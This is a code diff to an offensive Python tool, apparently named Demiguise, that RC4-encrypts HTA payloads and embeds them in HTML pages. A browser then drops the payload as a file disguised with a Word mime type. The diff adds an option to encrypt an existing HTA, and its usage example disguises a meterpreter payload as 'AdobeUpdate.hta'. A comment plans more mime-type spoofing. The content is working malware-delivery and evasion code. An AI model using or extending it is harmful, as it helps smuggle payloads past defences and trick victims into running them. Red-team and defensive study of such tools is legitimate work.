@@ -105,7 +105,6 @@ def payload_choices():
 def list_payloads():
 	print("\n\t".join(PAYLOAD_OPTIONS.keys()))
 
-
 if __name__ == '__main__':
 	parser = argparse.ArgumentParser(
 		description='"The Demiguise is a peaceful, herbivorous creature that can make itself invisible and tell the future which makes it very hard to catch."')
@@ -114,6 +113,7 @@ if __name__ == '__main__':
 	parser.add_argument("-l", "--list-payloads", help="List payloads available", action="store_const", const="list_payloads")
 	parser.add_argument("-c", "--command", help="Command to run from HTA", dest="command")
 	parser.add_argument("-o", "--output", help="Name of the HTA file to generate", dest="output")
+	parser.add_argument("-e", "--existing", help="Existing HTA to encrypt", dest="existing", type=argparse.FileType('r'))
 	args = parser.parse_args()
 
 	if args.list_payloads:
@@ -121,15 +121,17 @@ if __name__ == '__main__':
 		list_payloads()
 		sys.exit(1)
 
-	if args.key and args.command and args.output and args.payload:
-		hta_text = PAYLOAD_OPTIONS.get(args.payload).format(args.command, rand=rnd())
-		hta_encrypted = base64.b64encode(rc4(args.key, hta_text))
-		filename_encrypted = base64.b64encode(rc4(args.key, args.output))
-		# blobShim borrowed from https://github.com/mholt/PapaParse/issues/175#issuecomment-75597039
-		# TODO: Spoof other mime-types, maybe pick at random from a list of suitable candidates?
-		blobShim = """(function(b,fname){if(window.navigator.msSaveOrOpenBlob)
+	# blobShim borrowed from https://github.com/mholt/PapaParse/issues/175#issuecomment-75597039
+	# TODO: Spoof other mime-types, maybe pick at random from a list of suitable candidates?
+	blobShim = """(function(b,fname){if(window.navigator.msSaveOrOpenBlob)
 window.navigator.msSaveBlob(b,fname);else{var f = new File([b], fname, {type:"application/msword"});var a=window.document.createElement("a");a.href=window.URL.createObjectURL(f);a.download=fname;document.body.appendChild(a);a.click();document.body.removeChild(a)}})
 """
+
+	if args.key and args.command and args.output and args.payload:
+		hta_text = PAYLOAD_OPTIONS.get(args.payload).format(args.command, rand=rnd())
+
+		hta_encrypted = base64.b64encode(rc4(args.key, hta_text))
+		filename_encrypted = base64.b64encode(rc4(args.key, args.output))
 
 		msSaveBlob = base64.b64encode(rc4(args.key, blobShim))
 		blob = base64.b64encode(rc4(args.key, "Blob"))
@@ -140,6 +142,24 @@ window.navigator.msSaveBlob(b,fname);else{var f = new File([b], fname, {type:"ap
 		print("\n[*] Generating with key: {}".format(args.key))
 		print("[*] Will execute: {}".format(args.command))
 		print("[+] HTA file written to: {}".format(outfile))
+	elif args.existing and args.key and args.output:
+		hta_text = ''.join(args.existing.readlines())
+
+		hta_encrypted = base64.b64encode(rc4(args.key, hta_text))
+		filename_encrypted = base64.b64encode(rc4(args.key, args.output))
+
+		msSaveBlob = base64.b64encode(rc4(args.key, blobShim))
+		blob = base64.b64encode(rc4(args.key, "Blob"))
+
+		outfile = "{}.html".format(os.path.splitext(args.output)[0])
+		with open(outfile, 'w') as f:
+			f.write(HTML_TEMPLATE.format(rnd(), rnd(), hta_encrypted, rnd(), filename_encrypted, rnd(), args.key, msSaveBlob, rnd(), rnd(), blob))
+		print("\n[*] Generating with key: {}".format(args.key))
+		print("[*] Will execute: {}".format(args.command))
+		print("[+] HTA file written to: {}".format(outfile))
+		
 	else:
 		parser.print_help()
 		print('\n[*] Example: python demiguise.py -k hello -c "cmd.exe /c calc.exe" -o test.hta -p ShellBrowserWindow')
+		print('[*] Example: python demiguise.py -k hello -e ~/malware/meterpreter.hta -o AdobeUpdate.hta')
+
